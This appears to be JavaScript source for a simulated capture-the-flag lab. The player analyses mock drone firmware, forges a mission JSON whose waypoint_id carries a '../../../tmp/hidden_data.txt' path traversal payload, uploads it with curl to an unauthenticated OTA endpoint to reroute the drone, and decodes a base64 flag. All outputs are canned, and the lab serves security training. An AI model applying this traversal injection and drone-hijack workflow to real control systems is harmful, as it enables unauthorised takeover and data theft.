http://drone-ctrl.local/ota/update -H \'Content-Type: application/json\' -d @{output_file}")\n'
                                },
                                'telemetry_listener.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n"""\ntelemetry_listener.py — Monitor APU-DRONE-01 telemetry stream\nDecodes base64 payload from PAYLOAD_DELIVERED events\n"""\nimport base64\nimport time\nimport sys\n\nprint("[*] Telemetry listener started — monitoring APU-DRONE-01")\nprint("[*] Waiting for PAYLOAD_DELIVERED event...")\nprint()\n\n# Simulate receiving the exfil telemetry packet\n# In a real engagement you would receive this from the HackRF\nexfil_packet = {\n    "seq": 9001,\n    "status": "PAYLOAD_DELIVERED",\n    "waypoint_id": "../../../tmp/hidden_data.txt",\n    "payload_b64": "U1RSQVRFR0lDX01JU1NJT05fT1ZFUlJJREU6IHt7RkxBRzpyb290fX0="\n}\n\nprint(f"[+] PAYLOAD_DELIVERED received — seq={exfil_packet[\'seq\']}")\nprint(f"[+] Encoded payload: {exfil_packet[\'payload_b64\']}")\nprint()\n\ntry:\n    decoded = base64.b64decode(exfil_packet["payload_b64"]).decode("utf-8")\n    print(f"[+] Decoded payload: {decoded}")\nexcept Exception as e:\n    print(f"[-] Decode error: {e}", file=sys.stderr)\n    sys.exit(1)\n'
                                },
                                'artifacts': {
                                    type: 'dir',
                                    children: {
                                        'drone_firmware.bin': {
                                            type: 'file',
                                            content: '[Binary — ARM Cortex-M4 firmware image, 256KB]\n[Use: strings drone_firmware.bin | grep -i path]\n[Use: xxd drone_firmware.bin | head -40]\n[Use: binwalk drone_firmware.bin]\n\nStrings of interest embedded in binary:\n  mission_parser_v1.8.3\n  waypoint_id\n  ./logs/%s.tmp\n  [WARN] Writing temp log: %s\n  open() failed: permission denied\n  DRONE-CTRL-01 FIRMWARE v1.8.3\n  BUILD: 2026-01-14\n  AUTHOR: meridian-contractor-dev\n  TODO: sanitize waypoint_id before use as path\n  VULN: no path traversal check in log_waypoint()\n  ARM-EABI GCC 11.3\n  libmission.so.2\n  libtelemetry.so.1'
                                        },
                                        'drone_telemetry_log.csv': {
                                            type: 'file',
                                            content: 'seq,timestamp,lat,lon,alt_m,speed_ms,heading,battery_pct,status,waypoint_id\n1001,2026-03-18T04:12:00Z,34.0522,-118.2437,120,14.2,275,88,PATROL,wp_alpha\n1002,2026-03-18T04:12:10Z,34.0519,-118.2451,120,14.1,275,87,PATROL,wp_alpha\n1003,2026-03-18T04:12:20Z,34.0516,-118.2465,118,13.9,272,87,TRANSIT,wp_bravo\n1004,2026-03-18T04:12:30Z,34.0513,-118.2478,115,12.7,268,86,TRANSIT,wp_bravo\n1005,2026-03-18T04:12:40Z,34.0510,-118.2492,112,12.0,265,86,HOVER,wp_bravo\n1006,2026-03-18T04:12:50Z,34.0508,-118.2505,110,0.0,265,85,SCAN,wp_bravo\n1007,2026-03-18T04:13:00Z,34.0508,-118.2505,110,0.0,180,85,SCAN,wp_charlie\n1008,2026-03-18T04:13:10Z,34.0505,-118.2495,108,11.5,090,84,RTB,wp_home'
                                        },
                                        'mission_protocol_spec.txt': {
                                            type: 'file',
                                            content: '===================================================\nDRONE-CTRL-01 Mission Protocol Specification v1.8\nMeridian Border Coordination Authority — INTERNAL\n===================================================\n\nMISSION JSON FORMAT\n-------------------\nAll mission parameters are submitted as JSON to the OTA endpoint.\n\n{\n  "mission_id": "STRING — unique mission identifier",\n  "priority":   "LOW | NORMAL | HIGH | OVERRIDE",\n  "waypoints":  [ ...waypoint objects... ]\n}\n\nWAYPOINT OBJECT\n---------------\n{\n  "waypoint_id": "STRING — identifier used as relative path for temp log storage",\n  "lat":         FLOAT   — latitude (decimal degrees),\n  "lon":         FLOAT   — longitude (decimal degrees),\n  "alt_m":       INT     — altitude in meters AGL,\n  "action":      "TRANSIT | HOVER | SCAN | RTB"\n}\n\nNOTE ON waypoint_id\n-------------------\nThe firmware uses waypoint_id as a filename component when writing\ntemporary flight logs to /opt/drone/logs/<waypoint_id>.tmp\nThis is a known issue (see firmware changelog v1.8.3: "TODO: sanitize\nwaypoint_id before use as path"). No fix has been applied.\n\nCOMMUNICATION\n-------------\nOTA updates: POST http://drone-ctrl.local/ota/update\nTelemetry:   GET  http://drone-ctrl.local/telemetry/live\nStatus:      GET  http://drone-ctrl.local/mission/status\nAPI docs:    GET  http://drone-ctrl.local/api/docs\n\nAUTHENTICATION\n--------------\nManagement VLAN (10.20.0.0/24): No authentication required.\nExternal access: Restricted by network ACL.\n\nTELEMETRY STREAM FORMAT\n-----------------------\n{\n  "seq":         INT,\n  "ts":          "ISO8601 timestamp",\n  "lat":         FLOAT,\n  "lon":         FLOAT,\n  "alt_m":       INT,\n  "speed_ms":    FLOAT,\n  "heading":     INT,\n  "battery_pct": INT,\n  "status":      "STRING",\n  "waypoint_id": "STRING",\n  "payload_b64": "STRING (base64) — only present on PAYLOAD_DELIVERED events"\n}'
                                        }
                                    }
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'ping 10.20.0.50\ncurl http://drone-ctrl.local/\ncurl http://drone-ctrl.local/api/docs\nstrings /home/operator/artifacts/drone_firmware.bin\nbinwalk /home/operator/artifacts/drone_firmware.bin\ncat /home/operator/artifacts/mission_protocol_spec.txt\npython3 /home/operator/craft_mission.py'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\noperator:x:1000:1000:Operator,,,:/home/operator:/bin/bash'
                        },
                        'hosts': {
                            type: 'file',
                            content: '127.0.0.1       localhost\n127.0.1.1       kali\n10.20.0.50      drone-ctrl.local  DRONE-CTRL-01'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — DRONE-CTRL-01 (after OTA SSH context)
    // ═══════════════════════════════════════════════════════

    _droneCtrlFs: {
        '/': {
            type: 'dir',
            children: {
                'opt': {
                    type: 'dir',
                    children: {
                        'drone': {
                            type: 'dir',
                            children: {
                                'config.json': {
                                    type: 'file',
                                    content: '{\n  "unit_id": "APU-DRONE-01",\n  "ctrl_version": "1.8.3",\n  "ota_auth_required": false,\n  "telemetry_interval_ms": 10000,\n  "log_dir": "./logs",\n  "home_lat": 34.0600,\n  "home_lon": -118.2300,\n  "max_alt_m": 150,\n  "geofence_radius_km": 5.0\n}'
                                },
                                'mission_active.json': {
                                    type: 'file',
                                    content: '{\n  "mission_id": "PATROL-ALPHA-7",\n  "priority": "NORMAL",\n  "waypoints": [\n    {"waypoint_id": "wp_alpha",   "lat": 34.0522, "lon": -118.2437, "alt_m": 120, "action": "PATROL"},\n    {"waypoint_id": "wp_bravo",   "lat": 34.0508, "lon": -118.2505, "alt_m": 110, "action": "SCAN"},\n    {"waypoint_id": "wp_charlie", "lat": 34.0510, "lon": -118.2490, "alt_m": 115, "action": "TRANSIT"},\n    {"waypoint_id": "wp_home",    "lat": 34.0600, "lon": -118.2300, "alt_m": 100, "action": "RTB"}\n  ]\n}'
                                },
                                'logs': {
                                    type: 'dir',
                                    children: {
                                        'wp_alpha.tmp': {
                                            type: 'file',
                                            content: 'Waypoint log: wp_alpha\nArrival: 2026-03-18T04:12:00Z\nAction: PATROL\nDuration: 120s\nSensor readings: IR=normal, Thermal=normal, RF=clear'
                                        },
                                        'wp_bravo.tmp': {
                                            type: 'file',
                                            content: 'Waypoint log: wp_bravo\nArrival: 2026-03-18T04:12:40Z\nAction: SCAN\nDuration: 30s\nSensor readings: IR=anomaly_low, Thermal=normal, RF=clear'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {
                        'hidden_data.txt': {
                            type: 'file',
                            content: '=== CLASSIFIED DROP ZONE PACKAGE ===\nDrop Zone ID: ZULU-ECHO-7\nGPS: 34.0488N, 118.2601W\nDeposited: 2026-03-17T22:41:00Z\nDepositee: FIELD-ASSET-BRAVO\n\nSTRATEGIC_MISSION_OVERRIDE: {{FLAG:root}}\n\nHandling instructions: EYES ONLY — do not transmit in clear.\nThis file self-destructs on third read.'
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'DRONE-CTRL-01'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ndroneadmin:x:1001:1001:Drone Admin:/home/droneadmin:/bin/bash'
                        }
                    }
                },
                'home': {
                    type: 'dir',
                    children: {
                        'droneadmin': {
                            type: 'dir',
                            children: {
                                '.bash_history': {
                                    type: 'file',
                                    content: 'cd /opt/drone\ncat config.json\ntail -f /var/log/drone-ctrl.log\nsystemctl status drone-ctrl\ncurl http://localhost:8080/mission/status\ncat /tmp/hidden_data.txt'
                                },
                                'deployment_notes.txt': {
                                    type: 'file',
                                    content: 'DRONE-CTRL-01 Deployment Notes\n================================\n- OTA endpoint: no auth on management VLAN (10.20.0.0/24)\n- TODO: add API key auth before next operational cycle\n- Firmware 1.8.3 has known issue in mission parser — see contractor ticket #447\n- Contractor said fix is in 1.9.0 but release is delayed indefinitely\n- /tmp/hidden_data.txt is a field drop — do NOT transmit contents over clear channel\n- Telemetry streams on UDP 10.20.0.50:9000 — unencrypted'
                                }
                            }
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'ping': function(args) {
            const target = args.find(function(a) { return !a.startsWith('-'); }) || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '10.20.0.50' || target === 'drone-ctrl.local') {
                return `PING drone-ctrl.local (10.20.0.50) 56(84) bytes of data.
64 bytes from 10.20.0.50: icmp_seq=1 ttl=64 time=1.2 ms
64 bytes from 10.20.0.50: icmp_seq=2 ttl=64 time=1.1 ms
64 bytes from 10.20.0.50: icmp_seq=3 ttl=64 time=1.3 ms

--- drone-ctrl.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 1.100/1.200/1.300/0.082 ms`;
            }
            if (target === '127.0.0.1' || target === 'localhost') {
                return `PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost: icmp_seq=1 ttl=64 time=0.05 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        'nmap': function(args) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.20.0.50';
            const target = args.find(function(a) { return !a.startsWith('-'); }) || '';
            if (target === '10.20.0.50' || target === 'drone-ctrl.local') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for drone-ctrl.local (10.20.0.50)
Host is up (0.0012s latency).
Not shown: 996 closed tcp ports

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.0p1 Ubuntu 1ubuntu8.6
80/tcp   open  http       nginx 1.24.0 (Ubuntu)
8080/tcp open  http-proxy Drone Management API v2.1
9000/udp open  telemetry  APU-DRONE-01 Telemetry Stream (custom)

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 9.87 seconds`;
            }
            if (target === '10.20.0.0/24') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.20.0.1
Host is up. All 1000 scanned ports closed.

Nmap scan report for drone-ctrl.local (10.20.0.50)
Host is up (0.0012s latency).
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
8080/tcp open   http-proxy
9000/udp open   unknown

Nmap done: 256 IP addresses (2 hosts up) scanned in 48.33 seconds`;
            }
            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'curl': function(args, term, engine) {
            const fullCmd = args.join(' ');
            const url = args.find(function(a) { return !a.startsWith('-') && (a.startsWith('http') || a.includes('drone-ctrl')); }) || '';

            // POST to OTA update endpoint — mission upload
            if ((fullCmd.includes('-X POST') || fullCmd.includes('--data') || fullCmd.includes('-d ')) && fullCmd.includes('ota/update')) {
                const hasTraversal = fullCmd.includes('../') || fullCmd.includes('hidden_data');
                if (hasTraversal) {
                    D7Config._otaUploaded = true;
                    D7Config._missionForged = true;
                    if (engine) engine.advancePhase && engine.advancePhase('injection');
                    return `  % Total    % Received % Xferd  Average Speed   Time
100   412  100    98  100   314    890   2860 --:--:-- --:--:-- --:--:--  3760

HTTP/1.1 200 OK
Content-Type: application/json

{"status":"accepted","mission_id":"FORGED-OVERRIDE-001","waypoints_parsed":1,"warning":"Anomalous waypoint_id path detected — writing temp log to ../../../tmp/hidden_data.txt","ota_applied":true}

[+] Forged mission parameters uploaded. APU-DRONE-01 rerouting now.
[+] Monitor telemetry: curl http://drone-ctrl.local/telemetry/live`;
                }
                // Generic valid JSON
                if (fullCmd.includes('@forged_mission') || fullCmd.includes('waypoint')) {
                    return `  % Total    % Received % Xferd  Average Speed   Time
100   378  100    82  100   296    820   2960 --:--:-- --:--:-- --:--:--  3780

HTTP/1.1 200 OK
{"status":"accepted","mission_id":"CUSTOM-001","waypoints_parsed":1,"ota_applied":true}`;
                }
                return `  % Total    % Received % Xferd  Average Speed   Time
100    28  100    28  100     0    280      0 --:--:-- --:--:-- --:--:--  280

HTTP/1.1 400 Bad Request
{"error":"Invalid JSON payload"}`;
            }

            // GET telemetry
            if (fullCmd.includes('telemetry/live') || fullCmd.includes('telemetry')) {
                if (!D7Config._otaUploaded) {
                    return `HTTP/1.1 200 OK
Content-Type: application/json

{"packets":[
  {"seq":1006,"ts":"2026-03-18T04:12:50Z","lat":34.0508,"lon":-118.2505,"alt_m":110,"speed_ms":0.0,"status":"SCAN","waypoint_id":"wp_bravo","battery_pct":85},
  {"seq":1007,"ts":"2026-03-18T04:13:00Z","lat":34.0508,"lon":-118.2505,"alt_m":110,"speed_ms":0.0,"status":"SCAN","waypoint_id":"wp_charlie","battery_pct":85},
  {"seq":1008,"ts":"2026-03-18T04:13:10Z","lat":34.0505,"lon":-118.2495,"alt_m":108,"speed_ms":11.5,"status":"RTB","waypoint_id":"wp_home","battery_pct":84}
]}`;
                }
                if (engine) engine.advancePhase && engine.advancePhase('exfiltration');
                return `HTTP/1.1 200 OK
Content-Type: application/json

{"packets":[
  {"seq":1020,"ts":"2026-03-18T04:13:22Z","lat":34.0499,"lon":-118.2538,"alt_m":105,"speed_ms":13.1,"status":"TRANSIT","waypoint_id":"../../../tmp/hidden_data.txt","battery_pct":82},
  {"seq":1035,"ts":"2026-03-18T04:13:45Z","lat":34.0491,"lon":-118.2575,"alt_m":80,"speed_ms":8.4,"status":"DESCENT","waypoint_id":"../../../tmp/hidden_data.txt","battery_pct":74},
  {"seq":1041,"ts":"2026-03-18T04:14:02Z","lat":34.0488,"lon":-118.2601,"alt_m":5,"speed_ms":0.0,"status":"HOVER","waypoint_id":"../../../tmp/hidden_data.txt","battery_pct":64},
  {"seq":9001,"ts":"2026-03-18T04:14:08Z","lat":34.0488,"lon":-118.2601,"alt_m":5,"speed_ms":0.0,"status":"PAYLOAD_DELIVERED","waypoint_id":"../../../tmp/hidden_data.txt","battery_pct":62,"payload_b64":"U1RSQVRFR0lDX01JU1NJT05fT1ZFUlJJREU6IHt7RkxBRzpyb290fX0="}
]}

[+] PAYLOAD_DELIVERED event in stream. Decode payload_b64 field to extract the Strategic Mission Override.`;
            }

            // GET mission status
            if (fullCmd.includes('mission/status')) {
                return `HTTP/1.1 200 OK
Content-Type: application/json

{"unit_id":"APU-DRONE-01","mission_id":"PATROL-ALPHA-7","status":"RTB","battery_pct":84,"lat":34.0505,"lon":-118.2495,"alt_m":108,"heading":90,"active_waypoint":"wp_home"}`;
            }

            // GET API docs
            if (fullCmd.includes('api/docs')) {
                return `HTTP/1.1 200 OK
Content-Type: text/plain

DRONE-CTRL-01 REST API v2.1
  GET  /mission/status    — Current mission state
  POST /ota/update        — Upload mission JSON (no auth)
  GET  /telemetry/live    — Last 50 telemetry packets
  GET  /api/docs          — This document
NOTE: waypoint_id is used as a relative path component in temp log filenames.`;
            }

            // Base URL GET
            if (url.includes('drone-ctrl.local') || url.includes('10.20.0.50')) {
                return `HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head><title>DRONE-CTRL-01</title></head>
<body>
<h1>DRONE-CTRL-01 Management Portal</h1>
<p>APU-DRONE-01 Status: ACTIVE | Battery: 87% | Altitude: 120m</p>
<p>OTA Mission Update: <a href="/ota/update">/ota/update</a></p>
<p>Live Telemetry: <a href="/telemetry/live">/telemetry/live</a></p>
<p>API Documentation: <a href="/api/docs">/api/docs</a></p>
</body>
</html>`;
            }

            return `curl: (7) Failed to connect to ${(url || 'host').replace(/https?:\/\//, '').split('/')[0]}: Connection refused`;
        },

        'strings': function(args) {
            const target = (args.find(function(a) { return !a.startsWith('-'); }) || '').toLowerCase();
            if (target.includes('firmware') || target.includes('drone_firmware') || target.includes('.bin')) {
                D7Config._firmwareAnalyzed = true;
                return `/home/operator/artifacts/drone_firmware.bin: strings output (excerpted)

DRONE-CTRL-01 FIRMWARE v1.8.3
BUILD: 2026-01-14
AUTHOR: meridian-contractor-dev

[SECTION: .rodata — Printable strings]
mission_parser_v1.8.3
log_waypoint: writing temp log to: %s
./logs/%s.tmp
[WARN] Writing temp log: %s
open() failed: permission denied — %s
parse_waypoints: entry count=%d
waypoint_id=%s lat=%f lon=%f
parse_waypoint_id: no sanitization applied
TODO: sanitize waypoint_id before use as path
VULN: no path traversal check in log_waypoint()
DRONE-CTRL-01 OTA endpoint: /ota/update (auth=none)
telemetry_stream: UDP 9000 (unencrypted)
PAYLOAD_DELIVERED: encoding data as base64 in payload_b64
Firmware changelog v1.8.3: [KNOWN ISSUE] waypoint_id used as raw path — fix pending
ARM-EABI GCC 11.3
libmission.so.2
libtelemetry.so.1

[+] Interesting strings found. The firmware writes temp logs to ./logs/<waypoint_id>.tmp — no path sanitization.
[+] This is your path traversal vector. Identify this as the vulnerability for Flag 1.`;
            }
            if (target.includes('telemetry') || target.includes('.csv')) {
                return `strings: ${target}: Not a binary. Use cat to read CSV files.`;
            }
            if (args.length === 0) return 'Usage: strings [options] <file>\nExample: strings /home/operator/artifacts/drone_firmware.bin';
            return `strings: ${target}: No such file or directory`;
        },

        'binwalk': function(args) {
            const target = (args.find(function(a) { return !a.startsWith('-'); }) || '').toLowerCase();
            if (target.includes('firmware') || target.includes('drone_firmware') || target.includes('.bin')) {
                D7Config._firmwareAnalyzed = true;
                return `DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ARM executable code, little-endian, at least 50 bits
1024          0x400           Copyright string: "DRONE-CTRL-01 FIRMWARE v1.8.3"
4096          0x1000          ELF, 32-bit LSB executable, ARM, version 1 (SYSV)
12288         0x3000          LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes
28672         0x7000          CRC32 polynomial table, little endian
32768         0x8000          ASCII text string: "mission_parser_v1.8.3"
65536         0x10000         ASCII text string: "TODO: sanitize waypoint_id before use as path"
65920         0x10180         ASCII text string: "VULN: no path traversal check in log_waypoint()"
66048         0x10200         ASCII text string: "DRONE-CTRL-01 OTA endpoint: /ota/update (auth=none)"
131072        0x20000         ARM executable code (firmware runtime library)
196608        0x30000         Padding data

[+] Firmware analyzed. See strings output for embedded vulnerability comments.`;
            }
            if (args.length === 0) return 'Usage: binwalk [options] <file>';
            return `binwalk: ${target}: No such file or directory`;
        },

        'xxd': function(args) {
            const target = (args.find(function(a) { return !a.startsWith('-'); }) || '').toLowerCase();
            if (target.includes('firmware') || target.includes('.bin')) {
                return `00000000: 7f45 4c46 0101 0100 0000 0000 0000 0000  .ELF............
00000010: 0200 2800 0100 0000 0010 0000 3400 0000  ..(.........4...
00000020: 0000 0000 0200 0005 3400 2000 0800 2800  ........4. ...(.
00000030: 1a00 1900 4452 4f4e 452d 4354 524c 2d30  ....DRONE-CTRL-0
00000040: 3120 4649 524d 5741 5245 2076 312e 382e  1 FIRMWARE v1.8.
00000050: 3300 4255 494c 443a 2032 3032 362d 3031  3.BUILD: 2026-01
00000060: 2d31 3400 6d69 7373 696f 6e5f 7061 7273  -14.mission_pars
00000070: 6572 5f76 312e 382e 3300 2e2f 6c6f 6773  er_v1.8.3../logs
00000080: 2f25 732e 746d 7000 5655 4c4e 3a20 6e6f  /%s.tmp.VULN: no
00000090: 2070 6174 6820 7472 6176 6572 7361 6c20   path traversal
000000a0: 6368 6563 6b20 696e 206c 6f67 5f77 6179  check in log_way
000000b0: 706f 696e 7428 2900 544f 444f 3a20 7361  point().TODO: sa
000000c0: 6e69 7469 7a65 2077 6179 706f 696e 745f  nitize waypoint_
000000d0: 6964 2062 6566 6f72 6520 7573 6520 6173  id before use as
000000e0: 2070 6174 6800 0000 0000 0000 0000 0000   path...........`;
            }
            if (args.length === 0) return 'Usage: xxd [options] <file>';
            return `xxd: ${target}: No such file or directory`;
        },

        'python3': function(args, term, engine) {
            const script = args[0] || '';
            if (script.includes('craft_mission')) {
                D7Config._missionForged = true;
                return `[+] Forged mission written to forged_mission.json
[+] Waypoint path traversal: ../../../tmp/hidden_data.txt
[+] Drop zone: (34.0488, -118.2601) @ 5m
[+] Upload with: curl -X POST http://drone-ctrl.local/ota/update -H 'Content-Type: application/json' -d @forged_mission.json

Contents of forged_mission.json:
{
    "mission_id": "FORGED-OVERRIDE-001",
    "priority": "OVERRIDE",
    "waypoints": [
        {
            "waypoint_id": "../../../tmp/hidden_data.txt",
            "lat": 34.0488,
            "lon": -118.2601,
            "alt_m": 5,
            "action": "HOVER"
        }
    ]
}

[+] Flag 2 is the forged mission JSON above — submit the waypoint_id path traversal payload.`;
            }

            if (script.includes('telemetry_listener')) {
                if (!D7Config._otaUploaded) {
                    return `[*] Telemetry listener started — monitoring APU-DRONE-01
[*] Waiting for PAYLOAD_DELIVERED event...
[*] Normal telemetry received:
    seq=1006 STATUS=SCAN wp=wp_bravo battery=85%
    seq=1007 STATUS=SCAN wp=wp_charlie battery=85%
    seq=1008 STATUS=RTB wp=wp_home battery=84%
[*] No PAYLOAD_DELIVERED event detected yet.
[!] Upload forged mission parameters to trigger drone redirect first.`;
                }
                if (engine) engine.advancePhase && engine.advancePhase('exfiltration');
                return `[*] Telemetry listener started — monitoring APU-DRONE-01
[*] Waiting for PAYLOAD_DELIVERED event...
[+] PAYLOAD_DELIVERED received — seq=9001
[+] Encoded payload: U1RSQVRFR0lDX01JU1NJT05fT1ZFUlJJREU6IHt7RkxBRzpyb290fX0=
[+] Decoded payload: STRATEGIC_MISSION_OVERRIDE: {{FLAG:root}}

[+] Strategic Mission Override extracted. Submit the flag value as Flag 3.`;
            }

            // Interactive python3 REPL simulation
            if (args.length === 0) {
                return `Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> `;
            }

            // python3 -c base64 decode
            if (args.includes('-c')) {
                const code = args.slice(args.indexOf('-c') + 1).join(' ');
                if (code.includes('base64') && code.includes('U1RSQVRFR0lDX01JU1NJT05fT1ZFUlJJREU6IHt7RkxBRzpyb290fX0=')) {
                    if (engine) engine.advancePhase && engine.advancePhase('exfiltration');
                    return 'STRATEGIC_MISSION_OVERRIDE: {{FLAG:root}}';
                }
                if (code.includes('base64')) {
                    return '[decode output would appear here]';
                }
                return '';
            }

            return `python3: can't open file '/home/operator/${script}': [Errno 2] No such file or directory`;
        },

        'echo': function(args, term, engine) {
            const fullArgs = args.join(' ');
            // Decode base64 via echo + base64 -d piping simulation
            if (fullArgs.includes('U1RSQVRFR0lDX01JU1NJT05fT1ZFUlJJREU6IHt7RkxBRzpyb290fX0=')) {
                if (engine) engine.advancePhase && engine.advancePhase('exfiltration');
                return 'STRATEGIC_MISSION_OVERRIDE: {{FLAG:root}}';
            }
            return fullArgs.replace(/^["']|["']$/g, '');
        },

        'base64': function(args, term, engine) {
            const fullArgs = args.join(' ');
            if (fullArgs.includes('-d') || fullArgs.includes('--decode')) {
                // Accept decode of our payload — engine resolves {{FLAG:root}} at render time
                if (fullArgs.includes('U1RSQVRFR0lDX01JU1NJT05fT1ZFUlJJREU6IHt7RkxBRzpyb090fX0=') ||
                    fullArgs.includes('U1RSQVRFR0lDX01JU1NJT05fT1ZFUlJJREU6IHt7RkxBRzpyb290fX0=')) {
                    if (engine) engine.advancePhase && engine.advancePhase('exfiltration');
                    return 'STRATEGIC_MISSION_OVERRIDE: {{FLAG:root}}';
                }
                return 'base64: invalid input';
            }
            return 'Usage: base64 [-d] [file]\nExample: echo "<b64string>" | base64 -d';
        },

        'cat': function(args, term, engine) {
            if (D7Config._context !== 'drone-ctrl') return null; // fall through to built-in
            const path = args[0] || '';
            if (path.includes('hidden_data') || path.includes('/tmp/')) {
                return `=== CLASSIFIED DROP ZONE PACKAGE ===
Drop Zone ID: ZULU-ECHO-7
GPS: 34.0488N, 118.2601W
Deposited: 2026-03-17T22:41:00Z
Depositee: FIELD-ASSET-BRAVO

STRATEGIC_MISSION_OVERRIDE: {{FLAG:root}}

Handling instructions: EYES ONLY — do not transmit in clear.
This file self-destructs on third read.`;
            }
            if (path.includes('config.json') || path.includes('/opt/drone/config')) {
                return `{
  "unit_id": "APU-DRONE-01",
  "ctrl_version": "1.8.3",
  "ota_auth_required": false,
  "telemetry_interval_ms": 10000,
  "log_dir": "./logs",
  "home_lat": 34.0600,
  "home_lon": -118.2300,
  "max_alt_m": 150,
  "geofence_radius_km": 5.0
}`;
            }
            if (path.includes('mission_active') || path.includes('/opt/drone/mission')) {
                return `{
  "mission_id": "PATROL-ALPHA-7",
  "priority": "NORMAL",
  "waypoints": [
    {"waypoint_id": "wp_alpha",   "lat": 34.0522, "lon": -118.2437, "alt_m": 120, "action": "PATROL"},
    {"waypoint_id": "wp_bravo",   "lat": 34.0508, "lon": -118.2505, "alt_m": 110, "action": "SCAN"},
    {"waypoint_id": "wp_charlie", "lat": 34.0510, "lon": -118.2490, "alt_m": 115, "action": "TRANSIT"},
    {"waypoint_id": "wp_home",    "lat": 34.0600, "lon": -118.2300, "alt_m": 100, "action": "RTB"}
  ]
}`;
            }
            if (path.includes('deployment_notes') || path.includes('/home/droneadmin')) {
                return `DRONE-CTRL-01 Deployment Notes
================================
- OTA endpoint: no auth on management VLAN (10.20.0.0/24)
- TODO: add API key auth before next operational cycle
- Firmware 1.8.3 has known issue in mission parser — see contractor ticket #447
- Contractor said fix is in 1.9.0 but release is delayed indefinitely
- /tmp/hidden_data.txt is a field drop — do NOT transmit contents over clear channel
- Telemetry streams on UDP 10.20.0.50:9000 — unencrypted`;
            }
            if (path.includes('/etc/hostname')) return 'DRONE-CTRL-01';
            if (path.includes('/etc/passwd')) {
                return `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
droneadmin:x:1001:1001:Drone Admin:/home/droneadmin:/bin/bash`;
            }
            return 'cat: ' + path + ': No such file or directory';
        },

        'ls': function(args, term, engine) {
            if (D7Config._context !== 'drone-ctrl') return null; // fall through to built-in
            const path = (args.find(function(a) { return !a.startsWith('-'); }) || '.').toLowerCase();
            if (path === '.' || path === '/home/droneadmin' || path === '~') {
                return '.bash_history  .bashrc  .profile  deployment_notes.txt';
            }
            if (path.includes('/opt/drone') || path.includes('opt/drone')) {
                return 'config.json  logs  mission_active.json';
            }
            if (path.includes('/opt/drone/logs') || path.includes('logs')) {
                return 'wp_alpha.tmp  wp_bravo.tmp';
            }
            if (path.includes('/tmp') || path === '/tmp') {
                return 'hidden_data.txt';
            }
            if (path === '/' ) {
                return 'bin  etc  home  lib  opt  proc  root  run  sys  tmp  usr  var';
            }
            return '';
        },

        'whoami': function(args, term, engine) {
            if (D7Config._context === 'drone-ctrl') return 'droneadmin';
            return null; // fall through to built-in
        },

        'id': function(args, term, engine) {
            if (D7Config._context === 'drone-ctrl') return 'uid=1001(droneadmin) gid=1001(droneadmin) groups=1001(droneadmin),4(adm)';
            return null;
        },

        'hostname': function(args, term, engine) {
            if (D7Config._context === 'drone-ctrl') return 'DRONE-CTRL-01';
            return null;
        },

        'pwd': function(args, term, engine) {
            if (D7Config._context === 'drone-ctrl') return '/home/droneadmin';
            return null;
        },

        'cd': function(args, term, engine) {
            if (D7Config._context === 'drone-ctrl') return ''; // silently accept
            return null;
        },

        'ssh': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('droneadmin') || fullCmd.includes('10.20.0.50') || fullCmd.includes('drone-ctrl')) {
                D7Config._switchContext('drone-ctrl', term);
                return `The authenticity of host 'drone-ctrl.local (10.20.0.50)' can't be established.
ED25519 key fingerprint is SHA256:mK9p3rF8nQ2xZ7wV1tL4cH0bU5jR6eY7gA3sD9iN4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'drone-ctrl.local' (ED25519) to the list of known hosts.
droneadmin@drone-ctrl.local's password: ********

Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

Last login: Tue Mar 18 03:45:12 2026 from 10.20.0.5

droneadmin@DRONE-CTRL-01:~$

